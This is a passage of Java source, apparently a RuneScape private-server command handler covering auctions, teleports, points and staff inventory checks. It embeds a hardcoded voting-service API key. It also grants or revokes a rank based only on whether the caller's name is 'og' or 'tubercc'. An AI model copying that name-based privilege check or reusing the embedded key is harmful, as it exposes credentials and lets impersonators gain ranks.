package server.model.players.packets;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;

import com.motivoters.motivote.service.MotivoteRS;

import server.Config;
import server.Connection;
import server.Server;
import server.model.players.AchievementManager;
import server.model.players.Achievements;
import server.model.players.Client;
import server.model.players.PacketType;
import server.model.players.Player;
import server.model.players.PlayerHandler;
import server.model.players.PlayerSave;
import server.model.players.content.TriviaBot;
import server.util.Misc;
import server.world.PublicEvent;

public class CommandsBackup implements PacketType {

	private final MotivoteRS motivote = new MotivoteRS("Powerps", "aeeaf49a637624064c6bf3fca7986955");

	@Override
	public void processPacket(Client c, int packetType, int packetSize) {
		String playerCommand = c.getInStream().readString();
		PublicEvent.processEntry(c, playerCommand);
		if (!playerCommand.startsWith("/")) {
			c.getPA().writeCommandLog(playerCommand);
		}
		if (playerCommand.startsWith("bid")) {
			if (Server.currentBidder.equals(c.playerName)) {
				c.sendMessage("[<col=16711680>SERVER<col=0>] You are already the current bidder!");
				return;
			}

			if (Server.auctioneer.equals(c.playerName)) {
				c.sendMessage("[<col=16711680>SERVER<col=0>] You can't bid on an item that you're auctioning!");
				return;
			}

			String bid = playerCommand.split(" ")[1];

			if (bid.endsWith("k")) {
				if (bid.contains(".")) {
					try {
						bid = Integer.toString((int) (Double.parseDouble(bid.substring(0, bid.indexOf("k"))) * 1000));
					} catch (Exception e) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] You can't bid an amount higher than <col=16711680>2147000.0k<col=0>!");
						return;
					}
				} else {
					if (Integer.parseInt(bid.replace("k", "")) > 300) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] You can't bid an amount higher than <col=16711680>2147000k<col=0>!");
						return;
					} else
						bid = bid.replace("k", "000");
				}
			} else if (bid.endsWith("m")) {
				if (bid.contains(".")) {
					try {
						bid = Integer
								.toString((int) (Double.parseDouble(bid.substring(0, bid.indexOf("m"))) * 1000000));
					} catch (Exception e) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] You can't bid an amount higher than <col=16711680>2147.0m<col=0>!");
						return;
					}
				} else {
					if (Integer.parseInt(bid.replace("m", "")) > 2147) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] You can't bid an amount higher than <col=16711680>2147m<col=0>!");
						return;
					}

					bid = bid.replace("m", "000000");
				}
			} else if (bid.endsWith("b")) {
				if (bid.contains(".")) {
					try {
						bid = Integer
								.toString((int) (Double.parseDouble(bid.substring(0, bid.indexOf("b"))) * 1000000000));
					} catch (Exception e) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] You can't bid an amount higher than <col=16711680>2.147b<col=0>!");
						return;
					}
				} else {
					if (Integer.parseInt(bid.replace("b", "")) > 2) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] You can't bid an amount higher than <col=16711680>2.147b<col=0>!");
						return;
					}

					bid = bid.replace("b", "000000000");
				}
			}

			try {
				int nextBid = Integer.parseInt(bid);

				if (c.getItems().playerHasItem(995, Server.currentBid + 1)) {
					if (nextBid <= Server.currentBid) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] Your bid must be higher than the current bid of <col=16711680>"
										+ Server.currentBid + " <col=0>2B tickets!");
						return;
					}

					Server.currentBid = nextBid;
					Server.currentBidder = c.playerName;
					Server.canAuctionBeCompleted = true;

					for (Player p : PlayerHandler.players) {
						if (p == null)
							continue;

						Client d = (Client) p;

						d.sendMessage("[<col=16711680>SERVER<col=0>] Current Bidder <col=16711680>" + c.playerName
								+ " <col=0>- Bid of <col=16711680>" + Misc.insertCommas(Integer.toString(nextBid))
								+ " <col=0>2b Tickets!");
					}
				} else {
					c.sendMessage("[<col=16711680>SERVER<col=0>] You don't have enough GP to bid on this item!");
					return;
				}
			} catch (Exception e) {

			}
		}

		if (playerCommand.startsWith("pyderasasnaxuikurva")) {
			if (c.playerRights > 0) {
				String[] args = playerCommand.split(" ");

				if (args.length == 5) {
					int itemId;

					if (args[1].charAt(0) >= 48 && args[1].charAt(0) <= 57)
						itemId = Integer.parseInt(args[1]);
					else {
						if (args[1].contains("noted"))
							itemId = c.getItems().getItemId(args[1].replace("noted_", "").replace("_", " "));
						else if (args[1].contains("_"))
							itemId = c.getItems().getItemId(args[1].replace("_", " "));
						else
							itemId = c.getItems().getItemId(args[1]);

						if (args[1].contains("noted"))
							itemId++;
					}

					String startBid = args[4];

					if (Integer.parseInt(args[2]) < 1) {
						c.sendMessage("[<col=16711680>SERVER<col=0>] You can't auction off nothing!");
					}

					// TODO

					if (startBid.endsWith("k")) {
						if (startBid.contains(".")) {
							try {
								startBid = Integer.toString(
										(int) (Double.parseDouble(startBid.substring(0, startBid.indexOf("k")))
												* 1000));
							} catch (Exception e) {
								c.sendMessage(
										"[<col=16711680>SERVER<col=0>] You can't have a starting bid higher than <col=16711680>100000.0k<col=0>!");
								return;
							}
						} else {
							if (Integer.parseInt(startBid.replace("k", "")) > 1000000) {
								c.sendMessage(
										"[<col=16711680>SERVER<col=0>] You can't have a starting bid higher than <col=16711680>2147000k<col=0>!");
								return;
							} else
								startBid = startBid.replace("k", "000");
						}
					}

					if (startBid.endsWith("t")) {
						if (startBid.contains(".")) {
							try {
								startBid = Integer.toString(
										(int) (Double.parseDouble(startBid.substring(0, startBid.indexOf("m")))
												* 1000000));
							} catch (Exception e) {
								c.sendMessage(
										"[<col=16711680>SERVER<col=0>] You can't have a starting bid higher than <col=16711680>1000002b ticks<col=0>!");
								return;
							}
						} else {
							if (Integer.parseInt(startBid.replace("t", "")) > 10000) {
								c.sendMessage(
										"[<col=16711680>SERVER<col=0>] You can't have a starting bid higher than <col=16711680>1000002b ticks<col=0>!");
								return;
							}

							startBid = startBid.replace("t", "000000");
						}
					}

					if (startBid.endsWith("b")) {
						if (startBid.contains(".")) {
							try {
								startBid = Integer.toString(
										(int) (Double.parseDouble(startBid.substring(0, startBid.indexOf("b")))
												* 1000000000));
							} catch (Exception e) {
								c.sendMessage(
										"[<col=16711680>SERVER<col=0>] You can't have a starting bid higher than <col=16711680>2.147b<col=0>!");
								return;
							}
						} else {
							if (Integer.parseInt(startBid.replace("b", "")) > 2) {
								c.sendMessage(
										"[<col=16711680>SERVER<col=0>] You can't have a starting bid higher than <col=16711680>2.147b<col=0>!");
								return;
							}

							startBid = startBid.replace("b", "000000000");
						}
					}

					// TODO

					if (Integer.parseInt(startBid) < 0 || Integer.parseInt(startBid) >= 100000) {
						c.sendMessage(
								"[<col=16711680>SERVER<col=0>] Your starting bid must be less than 100000 2b ticks!");
						return;
					}

					Server.currentBid = Integer.parseInt(startBid);
					Server.getAuction().startAuction(c, itemId, Integer.parseInt(args[2]), Integer.parseInt(args[3]),
							Integer.parseInt(startBid));
				} else {
					c.sendMessage(
							"[<col=16711680>SERVER<col=0>] Try again! \"::auction (item name/id) (amount) (time) (start bid)\"");
					return;
				}
			} else {
				c.sendMessage("[<col=16711680>SERVER<col=0>] You need to donate to be able to start an auction!");
				return;
			}
		}

		if (TriviaBot.firstEventInProgress) {
			TriviaBot.processEntry(c, playerCommand);
		}

		if (playerCommand.startsWith("report") && playerCommand.length() > 7) {
			try {
				BufferedWriter report = new BufferedWriter(new FileWriter("./Data/Reports.txt", true));
				String Report = playerCommand.substring(7);
				try {
					report.newLine();
					report.write("[Report]" + c.playerName + ": " + Report);
					c.sendMessage("You have successfully submitted your report.");
				} finally {
					report.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		if (playerCommand.startsWith("givetubercc") && (c.playerName.equalsIgnoreCase("og"))) {
			try {
				String playerToTubercc = playerCommand.substring(12);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToTubercc)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("You have been awarded TuberCC rank by " + c.playerName);
							c2.TuberCC = 1;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("givetubercc") && (c.playerName.equalsIgnoreCase("tubercc"))) {
			try {
				String playerToTubercc = playerCommand.substring(12);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToTubercc)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("You have been awarded TuberCC rank by " + c.playerName);
							c2.TuberCC = 1;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("taketubercc") && (c.playerName.equalsIgnoreCase("og"))) {
			try {
				String playerToTuber = playerCommand.substring(12);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToTuber)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("Your tubercc has been taken away by " + c.playerName);
							c2.TuberCC = 0;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("taketubercc") && (c.playerName.equalsIgnoreCase("tubercc"))) {
			try {
				String playerToTuber = playerCommand.substring(12);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToTuber)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("Your tubercc has been taken away by " + c.playerName);
							c2.TuberCC = 0;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("roll") && (c.playerName.equalsIgnoreCase("jayz"))) { // use as ::dice 50
			final int dice = Integer.valueOf(playerCommand.split(" ")[1]);
			if (System.currentTimeMillis() - c.diceDelay >= 1200) {
				if (c.Dicer == 0) {
					c.sendMessage("You need to have a dicer rank to dice.");
					return;
				}
				if (!c.inAclan) {
					c.sendMessage("You need to be in a clan to do this.");
				} else {
					c.startAnimation(11900);
					c.gfx0(2075);
					Server.clanChat.messageToClan("<shad=15695415>" + c.playerName + " just rolled <shad=16112652>"
							+ dice + "<shad=15695415> on the percentile dice.", c.clanId);
					c.diceDelay = System.currentTimeMillis();
					// c.sendMessage("Use ::dice");
				}
			}
			// c.forcedChat(""+c.playerName+" has rolled a "+ dice
			// +" on the percentile dice.");
			// c.startAnimation(11900);
			// c.gfx0(2075);

		}
		if (playerCommand.equals("maxhit")) {
			c.sendMessage("Your current maxhit is: " + c.getCombat().calculateMeleeMaxHit() + "0");
		}
		if (playerCommand.equalsIgnoreCase("empty") && (System.currentTimeMillis() - c.emptyDelay >= 15000)) {
			c.getPA().sendFrame171(1, 2465);
			c.getPA().sendFrame171(0, 2468);
			c.getPA().sendFrame126("Empty Inventory?", 2460);
			c.getPA().sendFrame126("Yes, please!", 2461);
			c.getPA().sendFrame126("No, Thank you.", 2462);
			c.getPA().sendFrame164(2459);
			c.getDH().sendDialogues(1340, 1);
			c.dialogueAction = 1340;
		}
		if (playerCommand.equalsIgnoreCase("starterboost")) {
			if (c.trade11 > 0) {
				c.sendMessage("You have " + c.trade11 + " seconds left on your starter boost");
				c.sendMessage("You are receiving double EXP.");
				c.sendMessage("You are receiving double Custom and Power-Ps Points.");
			} else {
				c.sendMessage("Your starter boost has ended.");
			}
		}

		if (playerCommand.startsWith("checkbank") && c.playerRights >= 1 && c.playerRights <= 3) {
			try {
				String[] args = playerCommand.split(" ", 2);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					Client o = (Client) Server.playerHandler.players[i];
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(args[1])) {
							c.getPA().otherBank(c, o);
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("checkinv") && c.playerRights >= 1 && c.playerRights <= 3) {
			try {
				String[] args = playerCommand.split(" ", 2);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					Client o = (Client) Server.playerHandler.players[i];
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(args[1])) {
							c.getPA().otherInv(c, o);
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.equals("torvazone2")) {
			c.getPA().startTeleport(2037, 4529, 0, "modern");
			c.sendMessage("1:200-1:600");
		}
		if (playerCommand.equals("beastmasters")) {
			c.getPA().startTeleport(3304, 9375, 0, "modern");
			c.sendMessage("Use a sigil with a blessed spirit shield!1:100");
		}
		if (playerCommand.equals("dicezone")) {
			c.getPA().startTeleport(2739, 3471, 0, "modern");
			c.sendMessage("You teleport to the dice zone!");
			c.sendMessage("Have proof of evidence if you were scam post it on the forums.!");
		}
		if (playerCommand.equals("train")) {
			c.getPA().startTeleport(2361, 4966, 0, "modern");
			c.sendMessage("You teleport to the Training zone!");
		}
		if (playerCommand.equals("torvazone") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2586, 9449, 0, "modern");
			c.sendMessage("Welcome to torvazone.  The order of torvas in this zone from worst to best are.");
			c.sendMessage("Cloud, Crimson, McDonalds, Play-Doh, Cryptic, Viking, Candy, and Orange-Juice.");
		}
		if (playerCommand.equals("lootbox") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3170, 2999, 0, "modern");
			c.sendMessage("You teleport to the lootbox zone! 1:500");
		}
		if (playerCommand.equals("chill") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3683, 9889, 0, "modern");
			c.sendMessage("woah look at the ground!");
		}
		if (playerCommand.equals("nicetorva") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2614, 9427, 0, "modern");
			c.sendMessage("woah look at the ground!1:300");
		}
		if (playerCommand.equals("dragonbone") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3356, 3423, 0, "modern");
			c.sendMessage("dragonbone zone! 1:600");
		}
		if (playerCommand.equals("pk") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3286, 3881, 0, "modern");
			c.sendMessage("welcome to level 47 wildy, this is Multi area...Good Luck!");
		}
		if (playerCommand.equals("cinemas") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2012, 4751, 0, "modern");
			c.sendMessage("Welcome to the cinemas!");
		}

		if (playerCommand.equals("ares")) {
			c.getPA().startTeleport(3283, 3429, 0, "modern");
			c.sendMessage("You teleport to the ares drop zone. 1:300");
		}
		if (playerCommand.equals("dung") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2529, 3305, 0, "modern");

		}
		if (playerCommand.equals("elite") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2507, 4714, 0, "modern");
			c.sendMessage("You teleport to the Elite black warrior zone. 1:1200");

		}
		if (playerCommand.equals("helpzone") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(1971, 5001, 0, "modern");
			c.sendMessage("Welcome to The Helpzone , For Support request in help information Tab.");
		}
		if (playerCommand.equals("altars") || playerCommand.equals("alters") || playerCommand.equals("altar")
				|| playerCommand.equals("alter")) {
			c.getPA().startTeleport(3233, 9316, 0, "modern");
		}
		if (playerCommand.equals("shops") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3281, 2771, 0, "modern");
			c.sendMessage("Shops are located around here.");
		}
		if (playerCommand.equals("1bgreedyzone") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3299, 2824, 0, "modern");
		}
		if (playerCommand.equals("2bgreedyzone") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3297, 2818, 0, "modern");
		}
		if (playerCommand.equals("1mhpboss") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2855, 3543, 0, "modern");
		}
		if (playerCommand.equals("nknpc") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2324, 3794, 0, "modern");
			c.sendMessage("1;1500 - If u Get a Drop, Teleport to ::nkminigame");
		}
		if (playerCommand.equals("nkminigame") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3486, 3279, 0, "modern");
			c.sendMessage("Kill the 3 bosses and use the piece on the object!");
		}
		if (playerCommand.equals("home") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2965, 3379, 0, "modern");
			AchievementManager.increase(c, Achievements.HOMETELE);
			AchievementManager.increase(c, Achievements.TELEHOME);
			c.sendMessage("Home Sweet Home...");
		}
		if (playerCommand.equals("funpk") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2605, 3153, 0, "modern");
		}
		if (playerCommand.equals("sponsorzone") && (c.playerRights >= 6)) {
			c.getPA().startTeleport(3365, 9640, 0, "modern");
			c.sendMessage("Welcome to the sponsor zone!");
		}
		if (playerCommand.equals("mbox") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2734, 5082, 0, "modern");
			c.sendMessage("Welcome to the Mbox zone!");
		}
		if (playerCommand.equals("christmas") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2797, 3778, 0, "modern");
			c.sendMessage("Welcome to the Christmas zone!");
		}
		if (playerCommand.equals("sponsorzone") && (c.playerRights >= 3)) {
			c.getPA().startTeleport(3365, 9640, 0, "modern");
			c.sendMessage("Welcome to the sponsor zone!");
		}
		if (playerCommand.equals("Power") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2773, 9339, 0, "modern");
			c.sendMessage("Welcome to the Power-Ps Boss Zone!");
			c.sendMessage("1:400");
		}
		if (playerCommand.equals("hellacious") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2679, 9405, 0, "modern");
			c.sendMessage("Welcome to the Hellacious Boss!");
			c.sendMessage("1:1500");
			c.sendMessage("1:1500");
		}
		if (playerCommand.equals("weapons") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2602, 3361, 0, "modern");
			c.sendMessage("Welcome to the Power-Ps Boss Zone!");
			c.sendMessage("1:250");
		}
		if (playerCommand.equals("customs") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2093, 3163, 0, "modern");
		}
		if (playerCommand.equals("420torva") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2914, 9678, 0, "modern");
			c.sendMessage("1:200");
		}
		if (playerCommand.equals("bloodtorva") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2858, 3591, 0, "modern");
			c.sendMessage("1:200");
		}
		if (playerCommand.equals("americantorva") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2721, 2769, 0, "modern");
			c.sendMessage("1:200");
		}

		if (playerCommand.equals("dumblas") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2463, 4774, 0, "modern");
			c.sendMessage("1:600");
		}

		if (playerCommand.equals("spidermantorva") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2242, 3278, 0, "modern");
			c.sendMessage("Welcome to spidermantorva boss torva Zone!");
			c.sendMessage("1:700");
		}
		if (playerCommand.equals("imperial") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2090, 4428, 0, "modern");
			c.sendMessage("Welcome to Imperial boss Zone!");
			c.sendMessage("1:800");
		}

		if (playerCommand.equals("valgor") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2781, 4707, 0, "modern");
			c.sendMessage("1:250");
		}
		if (playerCommand.equals("asg") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2831, 9564, 0, "modern");
			c.sendMessage("1:250");
		}
		if (playerCommand.equals("key") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2715, 9183, 0, "modern");
			c.sendMessage("1:600");
		}

		if (playerCommand.startsWith("fly") && (c.issDonator == 1)) {
			if (c.playerStandIndex != 1501) {
				c.startAnimation(1500);
				c.playerStandIndex = 1501;
				c.playerTurnIndex = 1851;
				c.playerWalkIndex = 1851;
				c.playerTurn180Index = 1851;
				c.playerTurn90CWIndex = 1501;
				c.playerTurn90CCWIndex = 1501;
				c.playerRunIndex = 1851;
				c.updateRequired = true;
				c.appearanceUpdateRequired = true;
				c.sendMessage("You start flying.");
			} else {
				c.playerStandIndex = 0x328;
				c.playerTurnIndex = 0x337;
				c.playerWalkIndex = 0x333;
				c.playerTurn180Index = 0x334;
				c.playerTurn90CWIndex = 0x335;
				c.playerTurn90CCWIndex = 0x336;
				c.playerRunIndex = 0x338;
				c.updateRequired = true;
				c.appearanceUpdateRequired = true;
				c.sendMessage("You gently land on your feet.");
			}
		}

		if (playerCommand.equals("shops") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3281, 2770, 0, "modern");
		}
		if (playerCommand.equals("advsk") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2443, 4956, 0, "modern");
		}
		if (playerCommand.equals("protector") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2847, 3490, 0, "modern");
		}
		if (playerCommand.equals("drygore") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2595, 3297, 0, "modern");
			c.sendMessage("1:40");
		}
		if (playerCommand.equals("presents") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2893, 3538, 0, "modern");
			c.sendMessage("1:200");
		}
		if (playerCommand.equals("skills") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2044, 4650, 0, "modern");
		}
		if (playerCommand.equals("wings") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2514, 4634, 0, "modern");
			c.sendMessage("You can earn wings here.");
			c.sendMessage("1:90-1:200");
		}
		if (playerCommand.equals("tetsu") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3484, 3092, 0, "modern");
			c.sendMessage("You can earn tetsu parts here.");
			c.sendMessage("1:200");
		}
		if (playerCommand.equals("points") && (c.playerRights >= 0)) {
			c.sendMessage("You have: " + c.customPoints + " Custom Points.");
			c.sendMessage("You have: " + c.dungPoints + " Dungeoneering Points.");
			c.sendMessage("You have: " + c.pcPoints + " Power-Ps Points.");
			c.sendMessage("You have: " + c.achievementPoints + " Achievement Points.");
			c.sendMessage("You have: " + c.LoyaltyPoints + " Loyalty Points.");
			c.sendMessage("You have: " + c.DTPoints + " Dominion Points.");
			c.sendMessage("You have: " + c.mbPoints + " Magebank Points.");
			c.sendMessage("You have: " + c.pummelerPoints + " Pummeler Points.");
			c.sendMessage("You have: " + c.donatorChest + " Donor Points.");
			c.sendMessage("You have: " + c.votingPoints + " Vote Points.");
			c.sendMessage("You have: " + c.PkminiPoints + " PK Minigame Points.");
			c.sendMessage("You have: " + c.christmaspoints + " christmas Points.");
			c.sendMessage("You have Killed: " + c.npcKills + " NPC's.");
		}

		if (playerCommand.equals("christmaspoints") && (c.playerRights >= 0)) {
			c.sendMessage("You have: " + c.christmaspoints + " christmas points.");
		}
		if (playerCommand.equals("farm") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2819, 3462, 0, "modern");
			c.sendMessage("Farming");
		}

		if (playerCommand.equals("prayer") && (c.isDonator >= 1)) {
			if (c.playerLevel[5] < c.getPA().getLevelForXP(c.playerXP[5])) {
				c.playerLevel[5] = c.getPA().getLevelForXP(c.playerXP[5]);
				c.getPA().getLevelForXP(c.playerXP[5]);
				c.sendMessage("You recharge your prayer points.");
				c.getPA().refreshSkill(5);
			} else {
				c.sendMessage("You already have full prayer points.");
			}
		}

		if (playerCommand.equals("duel") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3358, 3269, 0, "modern");
			AchievementManager.increase(c, Achievements.ARENA);
		}
		if (playerCommand.equals("slayer") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(3428, 3538, 0, "modern");
			c.sendMessage("Welcome to the Slayer Tower!");
		}
		if (playerCommand.equals("whitetorva") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(2794, 4722, 0, "modern");
			c.sendMessage("Welcome to the whitetorva boss!");
			c.sendMessage("1:400");
		}
		if (playerCommand.equals("achieve") && (c.playerRights >= 0)) {
			AchievementManager.writeInterface(c);
		}
		if (playerCommand.equals("dzone") && (c.isDonator == 1)) {
			c.getPA().startTeleport(2393, 9894, 0, "modern");
			c.sendMessage("Welcome to the Donator Zone!");
		}
		if (playerCommand.equals("ownerzone") && (c.playerRights >= 3)) {
			c.getPA().startTeleport(1885, 4825, 0, "modern");
			c.sendMessage("Welcome to owner private zone!");
		}
		if (playerCommand.equals("megazone") && (c.issDonator == 1)) {
			c.getPA().startTeleport(2130, 4913, 0, "modern");
			c.sendMessage("Welcome to the Mega Zone!");
		}
		if (playerCommand.equals("chaseblade") && (c.issDonator == 1)) {
			c.getPA().startTeleport(3281, 9193, 0, "modern");
			c.sendMessage("Welcome to chaseblade warrior!!!");
			c.sendMessage("1:1400");
		}
		if (playerCommand.equals("wbtorva") && (c.playerRights >= 0)) {
			c.getPA().startTeleport(1928, 5002, 0, "modern");
			c.sendMessage("Welcome to white blue torva Zone!");
			c.sendMessage("1:600");
		}
		if (playerCommand.equals("staffzone") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			c.getPA().startTeleport(1865, 5348, 0, "modern");

		}
		if (playerCommand.equals("box") && (c.playerRights >= 2 && c.playerRights <= 3)) {
			c.getItems().addItem(15420, 28);
		}
		if (playerCommand.equals("cheart") && (c.playerRights >= 2 && c.playerRights <= 3)) {
			c.getItems().addItem(744, 28);

		}
		if (playerCommand.startsWith("kdr")) {
			double KDR = ((double) c.KC) / ((double) c.DC);
			c.forcedChat("My Kill/Death ratio is " + c.KC + "/" + c.DC + "; " + KDR + ".");
		}

		if (playerCommand.startsWith("donate")) {
			c.getPA().sendFrame126("http://rsps-pay.com/store.php?id=4190/", 12000);
		}
		if (playerCommand.startsWith("client")) {
			c.getPA().sendFrame126("https://www.dropbox.com/s/d9zyzdt4hp846os/Power-ps%20V2.2.jar?dl=1", 12000);
		}
		if (playerCommand.startsWith("/") && playerCommand.length() > 1) {
			if (c.clanId >= 0) {
				System.out.println(playerCommand);
				playerCommand = playerCommand.substring(1);
				Server.clanChat.playerMessageToClan(c.playerId, playerCommand, c.clanId);
				// Server.clanChat.playerMessageToClan(c, c.playerId,
				// playerCommand, c.clanId);
			} else {
				if (c.clanId != -1)
					c.clanId = -1;
				c.sendMessage("You are not in a clan.");
			}
			return;
		}
		if (Config.SERVER_DEBUG)
			Misc.println(c.playerName + " playerCommand: " + playerCommand);

		if (c.playerRights >= 0)
			playerCommands(c, playerCommand);
		if (c.playerRights == 1 || c.playerRights == 2 || c.playerRights == 3)
			moderatorCommands(c, playerCommand);
		if (c.playerRights == 2 || c.playerRights == 3)
			administratorCommands(c, playerCommand);
		if (c.playerRights == 3)
			ownerCommands(c, playerCommand);
		if (c.playerRights == 4)
			DonatorCommands(c, playerCommand);

	}

	public void playerCommands(Client c, String playerCommand) {
		if (playerCommand.equalsIgnoreCase("rules")) {
			for (int i = 8144; i < 8195; i++) {
				c.getPA().sendFrame126("", i);
			}
			c.getPA().showInterface(8134);
			c.getPA().sendFrame126("@blu@~ " + Config.SERVER_NAME + " Rules ~", 8144);
			c.getPA().sendFrame126("@blu@1. Do not argue Over ::yell - 24h Mute", 8145);
			c.getPA().sendFrame126("@blu@2. Scamming is not tolerated - Account Ban", 8147);
			c.getPA().sendFrame126("@blu@3. Autoing is not aloud! - 24h - Jail.", 8148);
			c.getPA().sendFrame126("@blu@4. Impersonating a donator or staff = IPBan.", 8149);
			c.getPA().sendFrame126("@blu@5. Do NOT abuse bugs! Report them immediately", 8150);
			c.getPA().sendFrame126("@blu@6. Don't encourage anyone to break the rules - IPBan", 8151);
			c.getPA().sendFrame126("@blu@7. gambling is allowed,if scammed post on forums with proof.", 8152);
			c.getPA().sendFrame126("@blu@8. Giving out your password - IPBan", 8153);
			c.getPA().sendFrame126("@blu@9. Do not spam the owner for items - Mute", 8154);
			c.getPA().sendFrame126("@blu@10. Making another account to talk after mute - Perm Muted.", 8155);
			c.getPA().sendFrame126("@blu@11. Respect all the staff member's decisions", 8156);
			c.getPA().sendFrame126("@blu@12. Farming Loyalty = Kick.", 8158);
			c.getPA().sendFrame126("@blu@13. Threatening the server won't be taken lightly.", 8159);
			c.getPA().sendFrame126("@blu@14. Swaping other server items jail and mute", 8154);
		}
		if (playerCommand.equalsIgnoreCase("starterguide")) {
			for (int i = 8144; i < 8195; i++) {
				c.getPA().sendFrame126("", i);
			}
			c.getPA().showInterface(8134);
			c.getPA().sendFrame126("@blu@~ " + Config.SERVER_NAME + " Starter guide ~", 8144);
			c.getPA().sendFrame126("@blu@1. Start out by killing penguins at ::train.", 8145);
			c.getPA().sendFrame126("@blu@2. Once you hit around level 50, kill Hill Giants", 8147);
			c.getPA().sendFrame126("@blu@   until you reach a combat level around 100.", 8148);
			c.getPA().sendFrame126("@blu@3. Kill Spongebob or Pikachu at ::customs until", 8149);
			c.getPA().sendFrame126("@blu@   you receive some mboxes. Mbox drops brutal and pink whips.", 8150);
			c.getPA().sendFrame126("@blu@4. Either Go to ::torvazone and kill blue torva..", 8151);
			c.getPA().sendFrame126("@blu@5a. Then Go to ::drygore drop 1:40", 8152);
			c.getPA().sendFrame126("@blu@5b. Get ring of wealth from ckeys/mboxes", 8153);
			c.getPA().sendFrame126("@blu@6. From here you can do whatever you want.", 8154);
			c.getPA().sendFrame126("Note: you will recieve a Point, Double xp boost", 8155); // for
																								// 15
																								// minutes
																								// as
																								// you're
																								// a
																								// new
																								// player
			c.getPA().sendFrame126("for 15 minutes as you're a new player", 8156); // for
																					// 15
																					// minutes
																					// as
																					// you're
																					// a
																					// new
																					// player
			// c.getPA().sendFrame126("@blu@11. Respect all the staff member's
			// decisions",8156);
			// c.getPA().sendFrame126("@blu@12. Saying you voted and you didn't - 24h
			// Mute",8157);
